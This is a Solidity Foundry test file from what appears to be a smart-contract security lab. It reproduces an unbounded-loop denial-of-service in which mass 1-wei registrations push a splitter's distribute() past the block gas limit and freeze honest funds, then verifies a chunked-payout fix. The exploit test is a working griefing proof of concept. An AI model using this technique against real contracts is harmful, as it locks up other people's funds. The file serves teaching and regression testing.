// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableSplitter} from "../src/VulnerableSplitter.sol";
import {SafeSplitter} from "../src/SafeSplitter.sol";

/// @title LoopDoS.t.sol
/// @notice Lab 12 — Exploit + regression tests for unbounded-loop DoS.
///
/// Lab: Unbounded payout loop priced out of the block
///
/// Threat model:
///   `register()` is permissionless and `distribute()` pays the entire list
///   in one transaction, so the gas cost of a payout round is controlled by
///   whoever registers the most payees. A few thousand registrations — each
///   carrying 1 wei — push a single `distribute()` past the block gas limit.
///
/// Violated invariant:
///   "The gas cost of a user-triggered operation must not scale with state
///   that untrusted parties can grow without bound."
///
/// Reproduction (3,000 payees, 30M gas budget):
///   1. Attacker registers 3,000 payee addresses with 1 wei each.
///   2. Honest payees hold real balances in the same splitter.
///   3. `distribute()` with the block gas limit reverts out-of-gas — for
///      every caller, forever. There is no per-payee exit path.
///
/// Remediation (see SafeSplitter):
///   Chunked distribution with a persisted cursor: each call processes at
///   most `maxPayees` entries, so per-call gas is user-bounded and repeated
///   calls walk the list to completion.
///
/// Regression tests:
///   The identical list on SafeSplitter drains fully through bounded calls,
///   and every registered payee is paid exactly once.
contract LoopDoSTest is Test {
    uint256 internal constant GAS_BUDGET = 30_000_000;
    uint256 internal constant ATTACK_PAYEES = 3_000;
    uint256 internal constant HONEST_BALANCE = 1 ether;

    address internal attacker;
    address internal honest;

    function setUp() public {
        attacker = makeAddr("attacker");
        honest = makeAddr("honest");
    }

    function _seedPayee(VulnerableSplitter splitter, address p, uint256 value) internal {
        vm.deal(p, value);
        vm.prank(p);
        splitter.register{value: value}();
    }

    function _bloat(VulnerableSplitter splitter) internal {
        for (uint256 i = 1; i <= ATTACK_PAYEES; ++i) {
            _seedPayee(splitter, address(uint160(uint256(keccak256(abi.encode("payee", i))))), 1);
        }
        _seedPayee(splitter, honest, HONEST_BALANCE);
    }

    function testVulnerableDistributeBricksPastGasLimit() public {
        VulnerableSplitter splitter = new VulnerableSplitter();
        _bloat(splitter);

        assertEq(splitter.payeeCount(), ATTACK_PAYEES + 1);

        // A full round cannot fit the block gas budget anymore.
        vm.expectRevert();
        splitter.distribute{gas: GAS_BUDGET}();

        // And there is no alternative exit: honest funds are frozen.
        assertEq(splitter.owed(honest), HONEST_BALANCE);
    }

    function testSafeSplitterDrainsFullyThroughBoundedCalls() public {
        SafeSplitter splitter = new SafeSplitter();
        for (uint256 i = 1; i <= ATTACK_PAYEES; ++i) {
            address p = address(uint160(uint256(keccak256(abi.encode("payee", i)))));
            vm.deal(p, 1);
            vm.prank(p);
            splitter.register{value: 1}();
        }
        vm.deal(honest, HONEST_BALANCE);
        vm.prank(honest);
        splitter.register{value: HONEST_BALANCE}();

        // Bounded calls always complete; the walk finishes the whole list.
        bool done = false;
        while (!done) {
            done = splitter.distribute(250); // each call well under budget
        }
        assertTrue(done);

        assertEq(honest.balance, HONEST_BALANCE, "honest payee must be paid");
        assertEq(address(splitter).balance, 0, "splitter must be drained");
        assertEq(splitter.owed(honest), 0);
    }
}
